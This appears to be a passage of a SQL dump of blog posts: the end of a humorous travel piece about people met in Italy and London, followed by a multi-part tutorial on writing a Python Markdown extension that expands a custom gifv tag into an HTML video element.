<p>Brown Dog during this time, was torn between continuing to receive pats and also not losing the lead. Any pat would elicit a lean in that reinforced the pat as well as sitting on my foot, however any pat close to the neck or head would start a warning grown, presumable about ownership of the lead in his mouth. Super cute.</p>
<p>We moved once, slightly further up the river to see the repaired bridge and the Roman Amphitheater, meaning Brown Dog, who had laid down had to move. Being old he did not want to move. Liking pats, he wanted to move. Pats won out. As he finally made it to us, tragedy struck as he lay down again and, we parted ways. Here was the biggest decision he had to make: follow the newcomers and potentially get more pats or follow his human and get love and food. It took about a hundred meters and a bark or two before he decided to stick with his human. We think she was just super keen to practice her English language skills.</p>
<h2 id="mental-illness-milk-lady">Mental Illness Milk Lady</h2>
<p>Io Gatto ordered a ''latte'' at the train station in Milan which immediately confused the attendant. After lots of hand waving and inventing a new sign-language she got what she ordered: a cup of hot milk with <em>no</em>  coffee. A milk coffee in Italy is a <em>caffè</em> latte. We abandoned the milk and moved outside to order lunch and coffee somewhere else to save face when someone with a clear mental-illness walks into the store. An attendant kicks her out however she immediately follows him back in and begs for the abandoned milk. The attendant sees us; we deny ownership of the milk, and so he relents to giving her said milk. On her way past us, now brandishing a cup of hot milk, a small song of ''latte, latte, latte…'' can be heard.</p>
<h2 id="italian-army-dad">Italian Army Dad</h2>
<p>We sat in a beachside café in Vernazza after a three-kilometre walk from Monterosso. The whole area is some of the most beautiful seaside landscapes you will see. Signs indicate that it should be 90 minutes however I would argue that is for native mountain people and not fat and lazy tourists (German food will do that to a person).</p>
<p>Regardless, next to us was a family of three (Mum, Dad and Three Year Old) that were having a great time in the sun, clearly only there for the afternoon (talking to him later, they only lived a hundred or so kilometres away). They were playing with the napkins, eating great food and drinking great drinks.</p>
<p>He looked about as stereotypical as you can get: slicked back hair, wrap around sunglasses, olive tanned skin, the works. He was having a great time playing with his son, inventing games and fooling around. Every so often however he would glance at us and shy. Weird.</p>
<p>When he went to pay however, he offered to pay for our drinks as he felt that he was disturbing our romantic afternoon with his jiving. We tried to protest saying that we were not disturbed at all, but he was having none of it.</p>
<p>We started to talk and after learning we were from Australia he revealed that his sister-in-law was living in Sydney, and they had visited her and also travelled to Byron Bay, their dream home. I have no idea why you would leave the area around Cinco Terra (he lived an hour away in Pisa).</p>
<p>He then picked me for military (my bag gave it away), and he revealed that he had been in the Army and had also been deployed to Afghanistan under an Australian SF commander.</p>
<aside>The actual path is about 3.5 km long and from sea level up to about 160m and back again a couple of times. This length is divided in to 25 sections, each marked with a sign. We did not know this until the end where there is a big notice board explaining all this. Anyway, we are about two thirds up the first and biggest hill about an hour into the walk, when Io Gatto asks someone coming from the other direction is we are near the end yet; we could be as we have not see an accurate, to scale map or know how many markers in the signs. Her (American) response: ''Oh honey, no… no…''</aside>

<h2 id="oranges-guy">Oranges guy</h2>
<p>Once on top of the hills on the coast, the walk become much more manageable and quite relaxing, however the Sun and initial ascent take its toll. So when about a third of the way through the walk, a local orange farmer had run an extension lead from his farm above the path and was powering a juicer for the oranges he had picked from his trees that morning. There was no way to deny him.</p>
<p>He didn''t talk, however he did recognise joy and gratitude when observing the look on peoples faces when they imbibe his ambrosia. These oranges were really fantastic.</p>
<h2 id="french-guy">French Guy</h2>
<p>Quite often when we go on holiday, we end up running into the same people or groups and staying in step with them. This is not surprising: we stay in popular places and do popular things. Last time it happened was Tasmania with a family of five: Father, Mother, Eldest Child, and Identical Twins (fantastically the Twins had swapped one shoe each and wore their hair the same way).</p>
<p>This time it was the French Guy and his Wife. We first ran into them at dinner the first night we stayed in Montoroso. This guy exuded Frenchness: his size, his eating style, the clothes he wore, the lot! The stereotype was magnificent to behold.  Next time was breakfast the next day; no biggie, the restaurant is attached to the hotel. Then the town of Como, certainly a popular and obvious place, that afternoon, including a casual head nod to acknowledge the encounter. </p>
<p>Of course, we saw him the next day in Menzi. I believe in situations like this, the casual awkwardness needs to be called out, so upon seeing him and his Wife on the sightseeing train, I bellow a hearty ''bon journo'', much to his chagrin and the amusement of Wife.</p>
<p><em>We</em> didn''t see them again.</p>
<h2 id="the-professor">The Professor</h2>
<p>At said restaurant in Montoroso there was also a man dubiously dubbed The Professor. His tawdry coat, rotund belly and pale complexion screamed professor. But professor of what? Io Gatto had an idea: his thesis was a comparison of the effectiveness of the Dewey decimal system and sorting by spine colour. Turns out his research showed that colour coding sorting was much more effective than the old tried and trusted Dewey Decimal System. Who knew?</p>
<p>He was English which makes this so much better.</p>
<h2 id="berlin-tour-guy">Berlin tour guy</h2>
<p>English dude a season out of university was conducting the tour, who has discovered that a degree in philosophy does not an easily employed person make. So he is doing the Summer tour circuit for a season before heading back to the UK for another look at work. Very nicely summed up the culture, history, and zeitgeist of the city. I think philosophy has served him well.</p>
<h2 id="coffee-lady">Coffee lady</h2>
<p>I ordered a caffè latte, soya, decaf. The woman making the coffee was not impressed.</p>
<h2 id="peppermint-tea-lady">Peppermint tea lady</h2>
<p>My Aunt lives and works in London, England. I had not been for a decade so obviously we visited her and spent some time touring around the local suburb before hitting the tourist highlights. Next to my Aunt''s house, there is a kilometers long canal, complete with locks, and a really nice community that revolves around said canal; from people living in long boats that travel up and down the country to schools that use the canal as a social conduit, age-old derelict workshops strewn with vitrified bricks and timer contrasted with hyper modern housing complexes resplendent in their plastic and steel.</p>
<p>Despite Io Gatto protesting jetlag (and upon reflection, probably the flu) we set off down the canal. We discovered set into one of the many nooks and crannies of a faceless building directing our travel here lived a small tea and cake shop, no bigger than a small bus. On unknowably deliberate or not reclaimed seats and tables, we sat in the afternoon sun, watching a longboat sputter down the canal, off to explore parts unknown and while a heron searched for fish. I ordered a peppermint tea; the tattooed proprietor only had fresh. I was taken aback upon seeing her reach down and pull some peppermint leaves off the shrub next to her and put it into my cup. It took me a moment to realise I didn''t know what else I should have expected otherwise. I ate a pork pie at the resteraunt serveral hundered meters down the canal just to round out the Brittihs experience.</p>','2016-03-07 22:53:29','2016-03-07 22:53:29','<p>We met fun people on holiday. This is a list of some of them.</p>',NULL),
	 (12,'Let''s make a terrible Markdown extension pt1 - Background','lets-make-a-terrible-markdown-extension-pt1-background','blog','<p>In this page:</p>
<div class="toc">
<ul>
<li><a href="#downloads">Downloads</a></li>
<li><a href="#background">Background</a></li>
<li><a href="#the-problem">The problem</a></li>
<li><a href="#the-solution">The solution</a></li>
<li><a href="#the-result">The result</a></li>
<li><a href="#assumptions">Assumptions</a></li>
<li><a href="#lets-crack-on">Let''s crack on</a></li>
</ul>
</div>
<h2 id="downloads">Downloads</h2>
<p>You can play along at home by <a href="https://assets.themetacity.com/code/theMetaCityMarkdown">looking at the full source here</a> and <a href="https://assets.themetacity.com/code/theMetaCityMarkdown.tar.gz">download a gzipped version here</a>.</p>
<h2 id="background">Background</h2>
<p>Writing blog articles as vanilla HTML is no fun. To that end <a href="https://daringfireball.net/projects/markdown/">Markdown</a> was created, which for the most part works well enough. Occasionally however there will be some markup that is not processed by the standard Markdown core and is bothersome to type by hand. Custom markup that would be handy to be processed automatically. Let''s make some.</p>
<p>There are many variants and parsers in most languages that will take your Markdown and process it into HTML. I am going to do this in Python which has a nice package called Markdown that can process said files.</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">Markdown</span>
<span class="n">markdown</span><span class="o">.</span><span class="n">markdown</span><span class="p">(</span><span class="s1">&#39;#Example title to parse&#39;</span><span class="p">)</span>
</pre></div>


<p>This produces the expected output:</p>
<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Example title to parse<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</pre></div>


<p>Riveting.</p>
<p>Thankfully Python Markdown also has a mechanism for extending and adding your own extensions to the standard markup, which we are going to do.</p>
<h2 id="the-problem">The problem</h2>
<p>Typing out <code>&lt;video&gt;</code> tags by hand to be used when replacing gif files is cumbersome and takes an annoyingly long time.</p>
<h2 id="the-solution">The solution</h2>
<p>Define a new tag that automatically expands to a known good configuration and is quick to type out.</p>
<p>The proposed solution would look like <code>&lt;gifv baseFilename extension1,extension2,extension3 /&gt;</code></p>
<h2 id="the-result">The result</h2>
<div class="codehilite"><pre><span></span><span class="nt">&lt;video</span> <span class="na">autoplay=</span><span class="s">&quot;true&quot;</span> <span class="na">controls=</span><span class="s">&quot;false&quot;</span> <span class="na">loop=</span><span class="s">&quot;true&quot;</span> <span class="na">class=</span><span class="s">&quot;gifv&quot;</span><span class="nt">&gt;&lt;source</span> <span class="na">src=</span><span class="s">&quot;//assets.themetacity.com/gifv/gifv-demo-doggos.webm&quot;</span> <span class="nt">/&gt;&lt;/video&gt;</span>
</pre></div>


<p>becomes</p>
<div class="codehilite"><pre><span></span><span class="o">&lt;</span><span class="nv">video</span> <span class="nv">autoplay</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">true</span><span class="s2">&quot;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">gifv</span><span class="s2">&quot;</span> <span class="nv">controls</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">false</span><span class="s2">&quot;</span> <span class="k">loop</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">true</span><span class="s2">&quot;</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nv">source</span> <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">//assets.themetacity.com/gifv/gifv-demo-doggos.webm</span><span class="s2">&quot;</span> <span class="o">/&gt;</span>
<span class="o">&lt;/</span><span class="nv">video</span>
</pre></div>


<p>and puts a video in like this:</p>
<video autoplay="true" controls="false" loop="true" class="gifv"><source src="//assets.themetacity.com/gifv/gifv-demo-doggos.webm" /></video>

<h2 id="assumptions">Assumptions</h2>
<p>This is block level tag. Doing this inline doesn''t fit with the idea of how I want to use the tag.</p>
<p>Piggybacking on Imgur''s marketing with the use of <code>gifv</code>.</p>
<h2 id="lets-crack-on">Let''s crack on</h2>
<p>First stop is to <a href="https://pythonhosted.org/Markdown/extensions/api.html">the docs</a>. This is how we are going to define a new tag.</p>
<p><a href="lets-make-a-terrible-markdown-extension-pt1-5-build-and-deployment">Step 1.5 is to set up</a> a deployment/build method, which, while optional is pretty handy.</p>
<p>After that is to <a href="lets-make-a-terrible-markdown-extension-pt2-getting-testing">dig in and get testing</a>.</p>','2017-08-22 22:45:02','2017-08-22 22:45:02','<p>Part one of making a Python Markdown extension Where we talk about what we are going to try to build</p>',12),
	 (13,'Let''s make a terrible Markdown extension pt1.5 - Build and deployment','lets-make-a-terrible-markdown-extension-pt1-5-build-and-deployment','blog','<p>In this page:</p>
<div class="toc">
<ul>
<li><a href="#assumptions">Assumptions</a></li>
<li><a href="#setuppy">setup.py</a></li>
<li><a href="#installation">Installation</a></li>
<li><a href="#packages">Packages</a></li>
</ul>
</div>
<p>Building and deploying extensions works well as a package. Here is how to do it reasonably for the extension we are writing.</p>
<h2 id="assumptions">Assumptions</h2>
<p>You are using a <code>virtulenv</code> that is specific to this project. Amongst all the the usual parts it brings <code>pip</code> which we will use to do the actual deploying. While <code>virtualenv</code> is not needed but it does keep this process much easier to keep straight. How and where you setup <code>virtualenv</code> is left as an exercise to the reader. Unless there is a compelling reason mine are usually stored in a dedicated directory <code>~/.virtualenvs</code> so as not to pollute the build or working directory.</p>
<p>Oh, and unix.</p>
<h2 id="setuppy">setup.py</h2>
<p>This is the config <code>pip</code> uses when building and deploying. Looks something like this:</p>
<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>

<span class="kn">from</span> <span class="nn">setuptools</span> <span class="kn">import</span> <span class="n">setup</span>

<span class="n">setup</span><span class="p">(</span>
    <span class="n">name</span><span class="o">=</span><span class="s1">&#39;tmcmarkdown&#39;</span><span class="p">,</span>
    <span class="n">packages</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;tmcmarkdown&#39;</span><span class="p">,</span> <span class="s1">&#39;tmcmarkdown.extensions&#39;</span><span class="p">,</span> <span class="s1">&#39;tmcmarkdown.tests&#39;</span><span class="p">],</span>
    <span class="n">version</span><span class="o">=</span><span class="s1">&#39;1.0.2&#39;</span><span class="p">,</span>
    <span class="n">maintainer</span><span class="o">=</span><span class="s2">&quot;Doug Miller&quot;</span><span class="p">,</span>
    <span class="n">maintainer_email</span><span class="o">=</span><span class="s2">&quot;dougmiller@themetacity.com&quot;</span><span class="p">,</span>
    <span class="n">url</span><span class="o">=</span><span class="s2">&quot;themetacity.com&quot;</span><span class="p">,</span>
    <span class="n">py_modules</span><span class="o">=</span><span class="p">[</span>
        <span class="s1">&#39;gifv&#39;</span><span class="p">,</span>
    <span class="p">],</span>
    <span class="n">license</span><span class="o">=</span><span class="s1">&#39;LICENCE.md&#39;</span><span class="p">,</span>
    <span class="n">description</span><span class="o">=</span><span class="s1">&#39;A collection of markdown extensions used on theMetaCity.com&#39;</span><span class="p">,</span>
    <span class="n">long_description</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./README.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span>
    <span class="n">install_requires</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;markdown&#39;</span><span class="p">]</span>
<span class="p">)</span>
</pre></div>


<aside>
This is actaully a really good example of why it is advisable to use the <code>!#/usr/bin/env</code> python construct. If you haven''t see that before, the idea is that rather than hardcoding the path to the executable you want to run the script, you defer to the OS to tell you what the path to the executable is.

This allows you to run the same script under different environments (i.e., a system installation and a virtualenv installation).

It is a handy way to remove one portability issue which costs nothing in implement.
</aside>

<h2 id="installation">Installation</h2>
<p>The main driver here is obviously <code>setuptools</code>. This supersedes <code>distutils</code> and comes with <code>python</code> &gt;= 3.4</p>
<p>If you have not already, <a href="https://packaging.python.org">go read the docs</a>.</p>
<p>Defining the package here allows up to do two things that are quite useful: install the package we are going to build into the current python environment site-packages and link the package into the current site-packages.</p>
<p>The first idea is useful for when the package is ready to be installed. The second is more interesting as it allows you to install the package via symlink into the site-package which removes the need to run the installation script everytime the package is changed (i.e. during development).</p>
<p>For the first: <code>python setup.py install</code> and the second <code>python setup.py develop</code>.</p>
<h2 id="packages">Packages</h2>
<p>Your version of this could look something like this one does:</p>
<div class="codehilite"><pre><span></span>|-- tmcmarkdown
|   |-- extensions
|   |   |-- gifv.py
|   |   `-- __init__.py
|   |-- tests
|   |   |-- __init__.py
|   |   `-- testgifv.py
|   `-- __init__.py
|-- LICENSE.md
|-- README.txt
`-- setup.py
</pre></div>


<p>This setup lets us <code>tmcmarkdown.extensions.gifv</code> and then use classes in there, ostensibly <code>GifV</code>.</p>
<p>The contents of <code>setup.py</code> requires</p>
<p><a href="lets-make-a-terrible-markdown-extension-pt2-getting-testing">On to testing.</a></p>','2017-08-22 23:01:16','2017-08-22 23:01:16','<p>First and a half part of making a Python Markdown extension where we set up the files, installation, so we can get to work.</p>',12),
	 (14,'Let''s make a terrible Markdown extension pt2 - Getting testing','lets-make-a-terrible-markdown-extension-pt2-getting-testing','blog','<p>In this page:</p>
<div class="toc">
<ul>
<li><a href="#lets-test">Lets test</a></li>
<li><a href="#assumptions">Assumptions</a></li>
<li><a href="#gifvpy">GifV.py</a></li>
<li><a href="#testgifvpy">TestGifV.py</a></li>
</ul>
</div>
<h2 id="lets-test">Lets test</h2>
<p>Testing can be helpful. So let''s write some up.</p>
<h2 id="assumptions">Assumptions</h2>
<p>While we haven''t written any working code yet, we can set up working tests so that we can measure out progress as we fill out the class.</p>
<p>The package is on the path somewhere (by running `python setup.py develop).</p>
<h2 id="gifvpy">GifV.py</h2>
<p>Open up <code>GifV.py</code> and put in enough to not have the tests return an error.</p>
<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">GifV</span><span class="p">(</span><span class="n">Extension</span><span class="p">):</span>
    <span class="k">pass</span>
</pre></div>


<h2 id="testgifvpy">TestGifV.py</h2>
<p>The test file itself is straightforward: call markdown with the extension registered and double-check the output is as expected.</p>
<p>No setup or teardown needed.</p>
<p>Loading the extension is straightforward with <code>markdown.markdown(provided, extensions=[list of extensions])</code>.</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">markdown</span>
<span class="kn">import</span> <span class="nn">unittest</span>
<span class="kn">from</span> <span class="nn">tmcmarkdown.extensions.gifv</span> <span class="kn">import</span> <span class="n">GifV</span>


<span class="k">class</span> <span class="nc">TestGifV</span><span class="p">(</span><span class="n">unittest</span><span class="o">.</span><span class="n">TestCase</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">testNotEnoughOptions</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">provided</span> <span class="o">=</span> <span class="s1">&#39;&lt;gifv filename /&gt;&#39;</span>
        <span class="n">expected</span> <span class="o">=</span> <span class="s1">&#39;&lt;p&gt;&lt;gifv filename /&gt;&lt;/p&gt;&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertEqual</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">markdown</span><span class="o">.</span><span class="n">markdown</span><span class="p">(</span><span class="n">provided</span><span class="p">,</span> <span class="n">extensions</span><span class="o">=</span><span class="p">[</span><span class="n">GifV</span><span class="p">()]))</span>

    <span class="k">def</span> <span class="nf">testBasicOptions</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">provided</span> <span class="o">=</span> <span class="s1">&#39;&lt;gifv sampleFileName extension /&gt;&#39;</span>
        <span class="n">expected</span> <span class="o">=</span> <span class="s1">&#39;&lt;video autoplay=&quot;true&quot; class=&quot;gifv&quot; controls=&quot;false&quot; loop=&quot;true&quot;&gt;&lt;source src=&quot;//assets.themetacity.com/gifv/sampleFileName.extension&quot; /&gt;&lt;/video&gt;&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertEqual</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">markdown</span><span class="o">.</span><span class="n">markdown</span><span class="p">(</span><span class="n">provided</span><span class="p">,</span> <span class="n">extensions</span><span class="o">=</span><span class="p">[</span><span class="n">GifV</span><span class="p">()]))</span>

    <span class="k">def</span> <span class="nf">testBasicOptionsNoSpaceAtEnd</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">provided</span> <span class="o">=</span> <span class="s1">&#39;&lt;gifv sampleFileName extension/&gt;&#39;</span>
        <span class="n">expected</span> <span class="o">=</span> <span class="s1">&#39;&lt;video autoplay=&quot;true&quot; class=&quot;gifv&quot; controls=&quot;false&quot; loop=&quot;true&quot;&gt;&lt;source src=&quot;//assets.themetacity.com/gifv/sampleFileName.extension&quot; /&gt;&lt;/video&gt;&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertEqual</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">markdown</span><span class="o">.</span><span class="n">markdown</span><span class="p">(</span><span class="n">provided</span><span class="p">,</span> <span class="n">extensions</span><span class="o">=</span><span class="p">[</span><span class="n">GifV</span><span class="p">()]))</span>

    <span class="k">def</span> <span class="nf">testBasicOptionsWithStart</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">provided</span> <span class="o">=</span> <span class="s1">&#39;START &lt;gifv sampleFileName extension /&gt;&#39;</span>
        <span class="n">expected</span> <span class="o">=</span> <span class="s1">&#39;&lt;p&gt;START &lt;gifv sampleFileName extension /&gt;&lt;/p&gt;&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertEqual</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">markdown</span><span class="o">.</span><span class="n">markdown</span><span class="p">(</span><span class="n">provided</span><span class="p">,</span> <span class="n">extensions</span><span class="o">=</span><span class="p">[</span><span class="n">GifV</span><span class="p">()]))</span>

    <span class="k">def</span> <span class="nf">testBasicOptionsWithEnd</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">provided</span> <span class="o">=</span> <span class="s1">&#39;&lt;gifv sampleFileName extension /&gt; END&#39;</span>
        <span class="n">expected</span> <span class="o">=</span> <span class="s1">&#39;&lt;p&gt;&lt;gifv sampleFileName extension /&gt; END&lt;/p&gt;&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertEqual</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">markdown</span><span class="o">.</span><span class="n">markdown</span><span class="p">(</span><span class="n">provided</span><span class="p">,</span> <span class="n">extensions</span><span class="o">=</span><span class="p">[</span><span class="n">GifV</span><span class="p">()]))</span>

    <span class="k">def</span> <span class="nf">testMultipleExtensions</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">provided</span> <span class="o">=</span> <span class="s1">&#39;&lt;gifv sampleFileName extension,otherextension,thirdextension /&gt;&#39;</span>
        <span class="n">expected</span> <span class="o">=</span> <span class="s1">&#39;&lt;video autoplay=&quot;true&quot; class=&quot;gifv&quot; controls=&quot;false&quot; loop=&quot;true&quot;&gt;&lt;source src=&quot;//assets.themetacity.com/gifv/sampleFileName.extension&quot; /&gt;&lt;source src=&quot;//assets.themetacity.com/gifv/sampleFileName.otherextension&quot; /&gt;&lt;source src=&quot;//assets.themetacity.com/gifv/sampleFileName.thirdextension&quot; /&gt;&lt;/video&gt;&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertEqual</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">markdown</span><span class="o">.</span><span class="n">markdown</span><span class="p">(</span><span class="n">provided</span><span class="p">,</span> <span class="n">extensions</span><span class="o">=</span><span class="p">[</span><span class="n">GifV</span><span class="p">()]))</span>

    <span class="k">def</span> <span class="nf">testTooManyOptions</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">provided</span> <span class="o">=</span> <span class="s1">&#39;&lt;gifv sampleFileName extension extraUnneeded /&gt;&#39;</span>
        <span class="n">expected</span> <span class="o">=</span> <span class="s1">&#39;&lt;p&gt;&lt;gifv sampleFileName extension extraUnneeded /&gt;&lt;/p&gt;&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">assertEqual</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">markdown</span><span class="o">.</span><span class="n">markdown</span><span class="p">(</span><span class="n">provided</span><span class="p">,</span> <span class="n">extensions</span><span class="o">=</span><span class="p">[</span><span class="n">GifV</span><span class="p">()]))</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">unittest</span><span class="o">.</span><span class="n">main</span><span class="p">()</span>
</pre></div>


<p>Unfortunately whitespace matters in the output here so the long strings have to remain.</p>
<p>Running the tests is straightforward, from the base of the module:</p>
<div class="codehilite"><pre><span></span>python -m unittest discover tmcmarkdown
</pre></div>


<p>will give you</p>
<div class="codehilite"><pre><span></span><span class="nt">.......</span><span class="c"></span>
<span class="nb">----------------------------------------------------------------------</span><span class="c"></span>
<span class="c">Ran 7 tests in 0</span><span class="nt">.</span><span class="c">021s</span>

<span class="c">OK</span>
</pre></div>


<p>Hooray.</p>
<p>Next up is <a href="lets-make-a-terrible-markdown-extension-pt3-getting-coding">writing the bulk of the plugin</a>.</p>','2017-08-23 23:01:21','2017-08-23 23:01:21','<p>Second part of making a Python Markdown extension</p>',12),
	 (16,'Lets make a terrible Markdown extension pt4 - Getting coding pt2','lets-make-a-terrible-markdown-extension-pt4-getting-coding-pt2','blog','<p>In this page:</p>
<div class="toc">
<ul>
<li><a href="#processors">Processors</a><ul>
<li><a href="#preprocessors">Preprocessors</a></li>
<li><a href="#block-parser">Block parser</a></li>
<li><a href="#treeprocessor">Treeprocessor</a></li>
<li><a href="#inline-patterns">Inline patterns</a></li>
<li><a href="#post-processor">Post processor</a></li>
</ul>
</li>
<li><a href="#example-time">Example time!</a></li>
</ul>
</div>
<p>We now have all the parts in place to write the class that does the actual work of transforming text. As previously mentioned, there are several places throughout the markdown pipeline that we can insert our extension. <a href="https://pythonhosted.org/Markdown/extensions/api.html">Lets read the docs</a> then have a brief look at each.</p>
<h2 id="processors">Processors</h2>
<p>The general flow here is to look at the source, attempt to parse it and build a tree out of it, making manipulations along the way, then serialising the tree out as HTML.</p>
<h3 id="preprocessors">Preprocessors</h3>
<p>When <code>markdown</code> runs, the first process it runs makes the entire source available as a raw string. This will allow you to go through and correct any issues you find or work on the raw strings in some way. It is not smart in any way.</p>
<h3 id="block-parser">Block parser</h3>
<p>This looks at blocks of text separated by blank lines and attempts to build a <code>Tree</code> out of them. It is possible to manipulate this parsing.</p>
<h3 id="treeprocessor">Treeprocessor</h3>
<p>After block parsing, the process has built the source into an <code>ElementTree</code>. This will let you walk tree and modify it as you need.</p>
<h3 id="inline-patterns">Inline patterns</h3>
<p>The next process is to process inline strings i.e., the bold and underline and URL processing and other tags used within a string. It will not process HTMLesque tags.</p>
<h3 id="post-processor">Post processor</h3>
<p>At this point the <code>Tree</code> is serialised to a string and returned. If you need to you can run a <code>PostProcessor</code> to work with the output string.</p>
<h2 id="example-time">Example time!</h2>
<p>Let''s build a preprocessor as we want to make a new tag that allows building of <code>&lt;video&gt;</code> tags based on the <code>&lt;gif&gt;</code> tag mentioned previously.</p>
<p>From <code>GifVPreprocessor()</code> line mentioned previously, lets build the class:</p>
<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">extendMarkdown</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">md</span><span class="p">,</span> <span class="n">md_globals</span><span class="p">):</span>
<span class="hll">    <span class="n">md</span><span class="o">.</span><span class="n">preprocessors</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="s1">&#39;gifv&#39;</span><span class="p">,</span> <span class="n">GifVPreprocessor</span><span class="p">(</span><span class="bp">self</span><span class="p">),</span> <span class="s1">&#39;_begin&#39;</span><span class="p">)</span>
</span></pre></div>


<p>Preprocessors need to inherit from <code>markdown.preprocessors.Preprocessor</code> and define one method <code>run(lines)</code> with an argument of <code>lines</code> which is the entire source document.</p>
<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">GifVPreprocessor</span><span class="p">(</span><span class="n">Preprocessor</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">gifv</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">gifv</span> <span class="o">=</span> <span class="n">gifv</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

<span class="hll">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">lines</span><span class="p">):</span>
</span>        <span class="k">pass</span>
</pre></div>


<p>First step is to define a regex to match against when going through each line:</p>
<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">GifVPreprocessor</span><span class="p">(</span><span class="n">Preprocessor</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">gifv</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">gifv</span> <span class="o">=</span> <span class="n">gifv</span>
<span class="hll">        <span class="bp">self</span><span class="o">.</span><span class="n">RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;gifv ([\w0-9_-]+) ([\w0-9_-]+[,?[\w0-9_-]+]?) ?/&gt;$&#39;</span><span class="p">)</span>
</span>        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">lines</span><span class="p">):</span>
        <span class="k">pass</span>
</pre></div>


<p>This will match <code>&lt;gifv word extension1,extension2,extensionX /&gt;</code> with an optional space at the end there.</p>
<p>The run method is passed the entire source document; it is up to us to deal with it how we want.</p>
<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">GifVPreprocessor</span><span class="p">(</span><span class="n">Preprocessor</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">gifv</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">gifv</span> <span class="o">=</span> <span class="n">gifv</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;gifv ([\w0-9_-]+) ([\w0-9_-]+[,?[\w0-9_-]+]?) ?/&gt;$&#39;</span><span class="p">)</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">lines</span><span class="p">):</span>
        <span class="n">new_lines</span> <span class="o">=</span> <span class="p">[]</span>
<span class="hll">        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span>            <span class="n">m</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">RE</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
